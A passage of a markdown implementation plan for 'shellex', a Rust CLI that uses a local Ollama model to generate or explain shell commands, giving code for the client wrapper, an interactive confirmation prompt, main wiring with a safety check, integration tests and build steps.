pub async fn gather_context(ctx_tools: &[String]) -> String {
    let os = detect_os();
    let shell = detect_shell();
    let pm = detect_package_manager();

    let tool_refs: Vec<&str> = ctx_tools.iter().map(|s| s.as_str()).collect();
    let available = check_tools(&tool_refs).await;
    let available_refs: Vec<&str> = available.iter().map(|s| s.as_str()).collect();

    format_context_block(&os, &shell, &pm, &available_refs)
}

#[cfg(test)]
mod tests {
    // ... tests from step 1 ...
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --lib context`
Expected: All 6 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/context.rs
git commit -m "feat: implement environment detection for --ctx flag"
```

---

### Task 8: Ollama Client Wrapper (`ollama.rs`)

**Files:**
- Modify: `src/ollama.rs`

No unit tests for this module — the Ollama interaction is thin and tested via the `#[ignore]` integration test in Task 11.

- [ ] **Step 1: Implement the Ollama wrapper**

```rust
// src/ollama.rs
use anyhow::{bail, Context, Result};
use ollama_rs::generation::completion::GenerationRequest;
use ollama_rs::Ollama;

pub struct OllamaClient {
    client: Ollama,
    model: String,
    host: String,
    port: u16,
}

impl OllamaClient {
    pub fn new(url: &str, model: &str) -> Result<Self> {
        // Parse host and port from URL like "http://localhost:11434"
        let url_trimmed = url.trim_end_matches('/');
        let (host, port) = if let Some(last_colon) = url_trimmed.rfind(':') {
            let potential_port = &url_trimmed[last_colon + 1..];
            if let Ok(p) = potential_port.parse::<u16>() {
                (url_trimmed[..last_colon].to_string(), p)
            } else {
                (url_trimmed.to_string(), 11434)
            }
        } else {
            (url_trimmed.to_string(), 11434)
        };

        let client = Ollama::new(host.clone(), port);
        Ok(Self {
            client,
            model: model.to_string(),
            host,
            port,
        })
    }

    pub async fn generate(&self, system_prompt: &str, user_prompt: &str) -> Result<String> {
        // Note: GenerationRequest may support .system() — check ollama-rs docs at build time.
        // If available, use: GenerationRequest::new(model, user_prompt).system(system_prompt)
        // Fallback: embed system prompt in the prompt string.
        let full_prompt = format!("{}\n\nUser request: {}", system_prompt, user_prompt);
        let request = GenerationRequest::new(self.model.clone(), full_prompt);

        let response = self
            .client
            .generate(request)
            .await
            .context(format!(
                "Error: Cannot connect to Ollama at {}. Is it running? (ollama serve)",
                self.url_display()
            ))?;

        if response.response.trim().is_empty() {
            bail!("Error: Model returned empty response. Try a different model or rephrase.");
        }

        Ok(response.response)
    }

    fn url_display(&self) -> String {
        format!("{}:{}", self.host, self.port)
    }
}
```

- [ ] **Step 2: Verify it compiles**

Run: `cd /home/mihai/work/sysop/shellex && cargo build`
Expected: Compiles (may need to adjust ollama-rs imports based on actual crate version)

- [ ] **Step 3: Commit**

```bash
git add src/ollama.rs
git commit -m "feat: implement Ollama API client wrapper"
```

---

### Task 9: Interactive Prompt (`interactive.rs`)

**Files:**
- Modify: `src/interactive.rs`

No automated tests — this is terminal UI code that requires manual verification.

- [ ] **Step 1: Implement the interactive confirmation prompt**

```rust
// src/interactive.rs
use anyhow::Result;
use crossterm::{
    cursor,
    event::{self, Event, KeyCode, KeyEvent, KeyModifiers},
    execute,
    style::{Color, Print, ResetColor, SetForegroundColor},
    terminal::{self, ClearType},
};
use std::io::{stdout, Write};

pub enum UserAction {
    Run(String),
    Cancel,
}

/// Display the generated command and wait for user action.
/// Returns the (possibly edited) command to run, or Cancel.
pub fn prompt_command(command: &str) -> Result<UserAction> {
    let mut out = stdout();

    // Show the command
    execute!(
        out,
        SetForegroundColor(Color::Green),
        Print(format!("> {}", command)),
        ResetColor,
        Print("\n"),
        Print("  [Enter] Run  [Tab] Edit  [Esc] Cancel\n"),
    )?;

    terminal::enable_raw_mode()?;
    let result = wait_for_action(command);
    terminal::disable_raw_mode()?;

    // Clear the hint line
    execute!(out, cursor::MoveUp(1), terminal::Clear(ClearType::CurrentLine))?;

    result
}

fn wait_for_action(command: &str) -> Result<UserAction> {
    loop {
        if let Event::Key(key) = event::read()? {
            match key.code {
                KeyCode::Enter => return Ok(UserAction::Run(command.to_string())),
                KeyCode::Tab => return edit_command(command),
                KeyCode::Esc => return Ok(UserAction::Cancel),
                KeyCode::Char('c') if key.modifiers.contains(KeyModifiers::CONTROL) => {
                    return Ok(UserAction::Cancel);
                }
                _ => {}
            }
        }
    }
}

fn edit_command(initial: &str) -> Result<UserAction> {
    let mut out = stdout();
    let mut buffer: Vec<char> = initial.chars().collect();
    let mut cursor_pos: usize = buffer.len();

    // Clear and redraw with editable prompt
    execute!(
        out,
        cursor::MoveUp(2),
        terminal::Clear(ClearType::FromCursorDown),
    )?;
    redraw_edit_line(&buffer, cursor_pos)?;

    loop {
        if let Event::Key(key) = event::read()? {
            match key.code {
                KeyCode::Enter => {
                    execute!(out, Print("\n"))?;
                    let cmd: String = buffer.into_iter().collect();
                    return Ok(UserAction::Run(cmd));
                }
                KeyCode::Esc => {
                    execute!(out, Print("\n"))?;
                    return Ok(UserAction::Cancel);
                }
                KeyCode::Char('c') if key.modifiers.contains(KeyModifiers::CONTROL) => {
                    execute!(out, Print("\n"))?;
                    return Ok(UserAction::Cancel);
                }
                KeyCode::Left if cursor_pos > 0 => {
                    cursor_pos -= 1;
                    redraw_edit_line(&buffer, cursor_pos)?;
                }
                KeyCode::Right if cursor_pos < buffer.len() => {
                    cursor_pos += 1;
                    redraw_edit_line(&buffer, cursor_pos)?;
                }
                KeyCode::Home => {
                    cursor_pos = 0;
                    redraw_edit_line(&buffer, cursor_pos)?;
                }
                KeyCode::End => {
                    cursor_pos = buffer.len();
                    redraw_edit_line(&buffer, cursor_pos)?;
                }
                KeyCode::Backspace if cursor_pos > 0 => {
                    cursor_pos -= 1;
                    buffer.remove(cursor_pos);
                    redraw_edit_line(&buffer, cursor_pos)?;
                }
                KeyCode::Delete if cursor_pos < buffer.len() => {
                    buffer.remove(cursor_pos);
                    redraw_edit_line(&buffer, cursor_pos)?;
                }
                KeyCode::Char(c) => {
                    buffer.insert(cursor_pos, c);
                    cursor_pos += 1;
                    redraw_edit_line(&buffer, cursor_pos)?;
                }
                _ => {}
            }
        }
    }
}

fn redraw_edit_line(buffer: &[char], cursor_pos: usize) -> Result<()> {
    let mut out = stdout();
    let text: String = buffer.iter().collect();

    execute!(
        out,
        cursor::MoveToColumn(0),
        terminal::Clear(ClearType::CurrentLine),
        SetForegroundColor(Color::Yellow),
        Print(format!("> {}", text)),
        ResetColor,
        cursor::MoveToColumn((cursor_pos + 2) as u16), // +2 for "> " prefix
    )?;
    out.flush()?;
    Ok(())
}

/// Display a dangerous command warning and require explicit "yes" to proceed.
pub fn prompt_dangerous(command: &str, matched_patterns: &[String]) -> Result<UserAction> {
    let mut out = stdout();
    terminal::disable_raw_mode().ok(); // Ensure we're not in raw mode for this

    execute!(
        out,
        SetForegroundColor(Color::Red),
        Print("\nWarning: This command matches a dangerous pattern:\n"),
    )?;
    for pattern in matched_patterns {
        execute!(out, Print(format!("  - {}\n", pattern)))?;
    }
    execute!(
        out,
        ResetColor,
        Print(format!("shellex generated: {}\n\n", command)),
        Print("Type 'yes' to proceed, anything else cancels: "),
    )?;
    out.flush()?;

    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;

    if input.trim() == "yes" {
        Ok(UserAction::Run(command.to_string()))
    } else {
        Ok(UserAction::Cancel)
    }
}

/// Show the command in --yes mode (prints to stderr so stdout stays clean for the command's output).
pub fn print_yes_mode(command: &str) {
    eprintln!("> {}", command);
}
```

- [ ] **Step 2: Verify it compiles**

Run: `cd /home/mihai/work/sysop/shellex && cargo build`
Expected: Compiles successfully

- [ ] **Step 3: Commit**

```bash
git add src/interactive.rs
git commit -m "feat: implement interactive confirmation prompt with inline editing"
```

---

### Task 10: Main Wiring (`main.rs`)

**Files:**
- Modify: `src/main.rs`

- [ ] **Step 1: Implement main with both modes**

```rust
// src/main.rs
mod cli;
mod config;
mod context;
mod explain;
mod interactive;
mod ollama;
mod prompt;
mod safety;

use anyhow::{bail, Result};
use clap::Parser;
use std::process;

use cli::Args;
use config::Config;
use interactive::UserAction;

#[tokio::main]
async fn main() {
    if let Err(e) = run().await {
        eprintln!("{}", e);
        process::exit(1);
    }
}

async fn run() -> Result<()> {
    let args = Args::parse();

    // Load config
    let config_path = args
        .config
        .clone()
        .unwrap_or_else(Config::default_path);
    let mut config = Config::load_or_create(&config_path)?;

    // Resolve model (CLI flag overrides config)
    let model = args.model.as_deref().unwrap_or(&config.model);

    // Create Ollama client
    let client = ollama::OllamaClient::new(&config.ollama_url, model)?;

    if args.explain {
        // Explain mode
        run_explain(&client, &args.input).await
    } else {
        // Generate mode
        run_generate(&client, &args, &mut config, &config_path).await
    }
}

async fn run_explain(client: &ollama::OllamaClient, command: &str) -> Result<()> {
    let tokens = explain::tokenize(command);
    let segments = explain::format_segments(&tokens);
    let system_prompt = prompt::build_explain_system_prompt();

    let response = client.generate(&system_prompt, &segments).await?;
    println!("{}", response);
    Ok(())
}

async fn run_generate(
    client: &ollama::OllamaClient,
    args: &Args,
    config: &mut Config,
    config_path: &std::path::Path,
) -> Result<()> {
    // Build system prompt
    let os_info;
    let shell_info;
    let context_block;

    if args.ctx {
        let ctx = context::gather_context(&config.ctx_tools).await;
        os_info = context::detect_os();
        shell_info = context::detect_shell();
        context_block = Some(ctx);
    } else {
        os_info = context::detect_os();
        shell_info = context::detect_shell();
        context_block = None;
    }

    let system_prompt = prompt::build_generate_system_prompt(
        &os_info,
        &shell_info,
        context_block.as_deref(),
        &config.custom_prompt,
    );

    // Verbose: show prompt
    if args.verbose {
        eprintln!("[system] {}", system_prompt);
        eprintln!("[user] {}", args.input);
    }

    // Call LLM
    let raw_response = client.generate(&system_prompt, &args.input).await?;
    let command = prompt::parse_generate_response(&raw_response);

    if command.is_empty() {
        bail!("Error: Model returned empty response. Try a different model or rephrase.");
    }

    // Safety check
    let checker = safety::SafetyChecker::new(&config.dangerous_patterns)?;
    let safety_result = checker.check(&command);

    // Check if command exists
    check_command_exists(&command).await;

    // Handle --yes mode
    if args.yes {
        // First-time warning
        if !config.yes_warned {
            eprintln!("Warning: --yes mode executes without confirmation. You accept full responsibility.");
            config.yes_warned = true;
            config.save(config_path).ok();
        }

        if safety_result.is_dangerous() && !args.force {
            if let safety::SafetyResult::Dangerous(patterns) = &safety_result {
                eprintln!("Warning: This command matches a dangerous pattern:");
                for p in patterns {
                    eprintln!("  - {}", p);
                }
                eprintln!("shellex generated: {}", command);
                eprintln!("Use --force to override safety check in --yes mode.");
            }
            process::exit(2);
        }

        if args.dry_run {
            println!("{}", command);
            return Ok(());
        }

        interactive::print_yes_mode(&command);
        return execute_command(&command);
    }

    // Interactive mode
    let action = if safety_result.is_dangerous() {
        if let safety::SafetyResult::Dangerous(ref patterns) = safety_result {
            interactive::prompt_dangerous(&command, patterns)?
        } else {
            unreachable!()
        }
    } else {
        interactive::prompt_command(&command)?
    };

    match action {
        UserAction::Run(cmd) => execute_command(&cmd),
        UserAction::Cancel => {
            eprintln!("Cancelled.");
            Ok(())
        }
    }
}

fn execute_command(command: &str) -> Result<()> {
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string());
    let status = process::Command::new(&shell)
        .arg("-c")
        .arg(command)
        .stdin(process::Stdio::inherit())
        .stdout(process::Stdio::inherit())
        .stderr(process::Stdio::inherit())
        .status()?;

    process::exit(status.code().unwrap_or(1));
}

async fn check_command_exists(command: &str) {
    let first_token = command.split_whitespace().next().unwrap_or("");
    if first_token.is_empty() {
        return;
    }

    let result = tokio::process::Command::new("which")
        .arg(first_token)
        .output()
        .await;

    if let Ok(output) = result {
        if !output.status.success() {
            eprintln!("Warning: Command '{}' not found on this system.", first_token);
        }
    }
}
```

- [ ] **Step 2: Verify it compiles**

Run: `cd /home/mihai/work/sysop/shellex && cargo build`
Expected: Compiles successfully

- [ ] **Step 3: Verify it runs (no Ollama needed for --help)**

Run: `cd /home/mihai/work/sysop/shellex && cargo run -- --help`
Expected: Shows help text with all flags

- [ ] **Step 4: Commit**

```bash
git add src/main.rs
git commit -m "feat: wire all modules together in main with generate and explain modes"
```

---

### Task 11: Integration Tests

**Files:**
- Create: `tests/cli_test.rs`
- Create: `tests/ollama_test.rs`

- [ ] **Step 1: Write CLI integration tests**

```rust
// tests/cli_test.rs
use std::process::Command;

fn shellex() -> Command {
    Command::new(env!("CARGO_BIN_EXE_shellex"))
}

#[test]
fn test_help_flag() {
    let output = shellex().arg("--help").output().unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("shellex"));
    assert!(stdout.contains("--explain"));
    assert!(stdout.contains("--ctx"));
    assert!(stdout.contains("--yes"));
}

#[test]
fn test_version_flag() {
    let output = shellex().arg("--version").output().unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("shellex"));
}

#[test]
fn test_no_args_fails() {
    let output = shellex().output().unwrap();
    assert!(!output.status.success());
}
```

- [ ] **Step 2: Write Ollama ignored integration test**

```rust
// tests/ollama_test.rs

/// This test requires a running Ollama instance.
/// Run with: cargo test --test ollama_test -- --ignored
#[tokio::test]
#[ignore]
async fn test_generate_returns_nonempty_response() {
    let output = std::process::Command::new(env!("CARGO_BIN_EXE_shellex"))
        .args(["--yes", "--dry-run", "list files in current directory"])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // Should produce some output (the command)
    assert!(
        !stdout.trim().is_empty() || !stderr.trim().is_empty(),
        "Expected non-empty output. stdout: '{}', stderr: '{}'",
        stdout,
        stderr
    );

    // Should not contain markdown fences
    assert!(!stdout.contains("```"), "Response should not contain markdown fences");
}

#[tokio::test]
#[ignore]
async fn test_explain_returns_explanation() {
    let output = std::process::Command::new(env!("CARGO_BIN_EXE_shellex"))
        .args(["-e", "ls -la /tmp"])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.trim().is_empty(),
        "Expected non-empty explanation"
    );
}
```

- [ ] **Step 3: Run the non-ignored integration tests**

Run: `cd /home/mihai/work/sysop/shellex && cargo test --test cli_test`
Expected: All 3 tests PASS

- [ ] **Step 4: Commit**

```bash
git add tests/
git commit -m "test: add CLI integration tests and Ollama smoke tests"
```

---

### Task 12: Final Verification

**Files:** None (verification only)

- [ ] **Step 1: Run all non-ignored tests**

Run: `cd /home/mihai/work/sysop/shellex && cargo test`
Expected: All tests pass (unit + integration, excluding `#[ignore]`)

- [ ] **Step 2: Run clippy**

Run: `cd /home/mihai/work/sysop/shellex && cargo clippy -- -D warnings`
Expected: No warnings

- [ ] **Step 3: Fix any clippy warnings**

Address any warnings found, then re-run clippy.

- [ ] **Step 4: Build release binary**

Run: `cd /home/mihai/work/sysop/shellex && cargo build --release`
Expected: Compiles successfully, binary at `target/release/shellex`

- [ ] **Step 5: Manual smoke test (requires Ollama running)**

```bash
# Generate mode
./target/release/shellex "list files in current directory"
# Should show a command like: ls -la
# Press Enter to run, Esc to cancel

# Explain mode
./target/release/shellex -e "find / -name '*.log' -mtime -7 | xargs grep ERROR"
# Should print a structured explanation

# Context mode
./target/release/shellex --ctx "install htop"
# Should show apt install htop / dnf install htop / etc. based on your OS

# Dry run
./target/release/shellex --yes --dry-run "show disk usage"
# Should print the command to stdout without executing
```

- [ ] **Step 6: Commit any final fixes**

```bash
git add -A
git commit -m "chore: final cleanup and lint fixes"
```
